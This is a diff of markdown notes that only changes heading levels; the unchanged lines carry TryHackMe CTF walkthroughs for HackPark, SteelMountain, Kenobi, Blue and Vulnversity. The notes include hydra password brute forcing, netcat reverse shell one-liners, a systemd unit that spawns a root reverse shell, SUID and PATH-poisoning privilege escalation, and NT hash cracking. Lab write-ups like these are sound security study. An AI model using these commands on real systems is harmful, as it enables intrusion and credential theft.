@@ -5,9 +5,9 @@ tags: ['security', 'cryptography']
 icon: shield-lock
 ---
 
-## TryHackMe
+### TryHackMe
 
-###  HackPark
+####  HackPark
 
 Includes:
   - Windows
@@ -23,7 +23,7 @@ Includes:
 
 We can browse to the server via the internet to find a blog called `BlogEngine`. From here we can find a login page & can use hydra to try and exploit this.
 
-#### Hydra
+##### Hydra
 
 Try to login using random credentials & capture the body of the post request and note and changes on the page that would indicate a failed login.
 
@@ -41,7 +41,7 @@ hydra -vV -l admin -P /usr/share/wordlists/rockyou.txt \
 
 After about 30s we find the password and can now login.
 
-#### Exploiting `BlogEngine`
+##### Exploiting `BlogEngine`
 
 Using `searchsploit` to find exploits:
 ```bash
@@ -63,7 +63,7 @@ This file has a detailed overview at the top with how to go about using the expl
 
 Running the file will give a reverse shell to our listener.
 
-#### Enumerating
+##### Enumerating
 
 The shell we have is quite unstable so I want to stabilize it by creating a meterpreter shell via metasploit.
 
@@ -143,7 +143,7 @@ It also finds some AutoLogon credentials:
     DefaultPassword               :  4q6XvFES7Fdxs
 ```
 
-#### Privilege escalation
+##### Privilege escalation
 
 The hackpark room wants us to exploit the service, so I will ignore the AutoLogon credentials.
 
@@ -151,7 +151,7 @@ Looking through the logs in `C:\Program Files (x86)\SystemScheduler` we can see 
 
 Restart the listener we had earlier & wait for the next cycle (seems to be once every 1-2 minutes). This will give us a reverse shell as the `Administrator` account. From here we can gather the flags on both desktops and we've already ran `winPEAS` and gathered the other required information.
 
-### SteelMountain [TryHackMe]
+#### SteelMountain [TryHackMe]
 
 Attacking a Windows based machine.
 
@@ -167,7 +167,7 @@ Includes:
   - Misconfiguration & exploiting services
   - msfvenom
 
-#### Nmap
+##### Nmap
 
 Use nmap to scan windows machine. `-Pn` is specified because windows was ignoring icmp requests.
 
@@ -190,7 +190,7 @@ PORT      STATE SERVICE            REASON          VERSION
 49163/tcp open  msrpc              syn-ack ttl 127 Microsoft Windows RPC
 ```
 
-#### Search for exploits
+##### Search for exploits
 
 Find exploits related to the service running on port 8080, Rejetto Http File Server 2.3.
 
@@ -238,7 +238,7 @@ meterpreter>
 ```
 This gives us a meterpreter shell as bill now.
 
-#### Enumeration
+##### Enumeration
 
 Performing enumeration to find possible privilege esculation attack vectors using [`PowerUp`](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1).
 
@@ -294,7 +294,7 @@ PS> net start AdvancedSystemCareService9
 
 And we have an admin shell via our netcat listener
 
-## Kenobi
+#### Kenobi
 
 [TryHackMe ~ Kenobi](https://tryhackme.com/room/kenobi)
 
@@ -310,9 +310,9 @@ Includes:
   - SUID binaries
   - PATH poisoning
 
-### Recon
+##### Recon
 
-#### Nmap 
+##### Nmap 
 Port and service scan:
 ```bash
 nmap -sV -sC <ip> -oX nmap-service-scan.xml | tee nmap-sevice-scan.txt 
@@ -409,7 +409,7 @@ nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount <ip>
 ```
 Shows `/var` can be mounted via nfs.
 
-#### Samba
+##### Samba
 Connect:
 ```bash
 smbclient //<ip>/anonymous
@@ -436,9 +436,9 @@ searchsploit -p linux/remote/36742.txt
 ```
 `linux/remote/36742.txt` shows an example of using nc and ProFTPd 1.3.5 to copy files to different locations on the system.
 
-### Exploitation
+#### Exploitation
 
-#### Netcat -> ProFTPd File copy
+##### Netcat -> ProFTPd File copy
 We know the location of the ssh key from `log.txt` and a nfs location of `/var`.
 
 ```bash
@@ -451,23 +451,23 @@ SITE CPTO /var/tmp/id_rsa
 250 Copy successful
 ```
 
-#### Retrieving key
+##### Retrieving key
 ```bash
 mkdir /mnt/kenobi
 mount <ip>:/var /mnt/kenobi
 cp /mnt/kenobi/tmp/id_rsa .
 ```
 
-#### Using Key
+##### Using Key
 ```bash
 chmod 600 id_rsa
 ssh -i ./id_rsa kenobi@<ip>
 ```
 and we are in!
 
-#### Privilege Esculation
+##### Privilege Esculation
 
-#### Searching for root suid binaries
+##### Searching for root suid binaries
 ```bash
 find / -perm -u=s -type f 2>/dev/null
 ```
@@ -493,13 +493,13 @@ PATH=/tmp:$PATH; /usr/bin/menu
 ```
 Run the curl command via the menu binary and `#`, root shell!
 
-### Blue
+#### Blue
 
 [TryHackMe ~ Blue](https://tryhackme.com/room/blue)
 
 Notes on TryHackMe's room, blue. A beginner Windows challenge, covers basic recon, research, exploitation via metaspoilt & password cracking.   
 
-#### Nmap Recon
+##### Nmap Recon
 Use nmap to scan ports and try to find details about services and versions on those ports 
 ```bash
 nmap -sV -sC <target> -oX nmap-service-scan.xml
@@ -552,7 +552,7 @@ Service detection performed. Please report any incorrect results at https://nmap
 Nmap done: 1 IP address (1 host up) scanned in 66.88 seconds
 ```
 
-#### Searchspoilt
+##### Searchspoilt
 ```bash
 searchsploit --nmap ./nmap-service-scan.xml 
 
@@ -596,7 +596,7 @@ Shellcodes: No Results
 ```
 ^ didnt return what I was looking for, was looking for an SMB exploit. Did some research based on hints to find ms17-010.
 
-#### MSF
+##### MSF
 
 Searching:
 ```
@@ -651,7 +651,7 @@ migrate <process id>
 hashdump
 ```
 
-#### John
+##### John
 ```bash
 echo "Jon:1000:aad3b435b51404eeaad3b435b51404ee:ffb43f0de35be4d9917ac0cc8ad57f8d:::" > hash
 john --wordlist=/usr/share/wordlists/rockyou.txt --format=NT hash
@@ -668,25 +668,25 @@ Session completed
 
 From here find flags!
 
-### Vulnversity
+#### Vulnversity
 
 [TryHackMe ~ Vulnversity](https://tryhackme.com/room/vulnversity)
 
 Notes on the beginner challenge, vulnversity. Covers basic recon, web application testing, file inclusion, reverse shells and privilege esculation.  
 
-#### Nmap Recon
+##### Nmap Recon
 Use nmap to scan ports and try to find details about services and versions on those ports 
 ```bash
 nmap -sV -sC <target>
 ```
 
-#### Finding web routes
+##### Finding web routes
 Try bruteforce webpages/directories using [gobuster](https://github.com/OJ/gobuster)
 ```bash
 gobuster dir -u <webapp> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt 
 ```
 
-#### Netcat commands
+##### Netcat commands
 ```bash
 basic connection:
 nc -lvnp 4444 [> /path/to/file.ext]
@@ -696,17 +696,17 @@ reverse shells:
 nc -e /bin/bash <ip> <port>
 rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <ip> <port> >/tmp/f
 ```
-#### File inclusion for reverse shell
+##### File inclusion for reverse shell
 Upload [PHP reverse shell](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php) as `.phtml`, setup a nc listener, load the phtml location.
 
-#### Search for SUID bit
+##### Search for SUID bit
 ```bash
 find / -perm /4000
 ...
 /bin/systemctl
 ```
 
-#### Privilege esculation
+##### Privilege esculation
 Reverse shell using netcat openbsd from systemctl service.
 ```bash
 [Unit]
@@ -722,5 +722,3 @@ WantedBy=multi-user.target
 /bin/systemctl enable /path/to/root-shell.service
 /bin/systemctl start root-shell
 ```
-
-
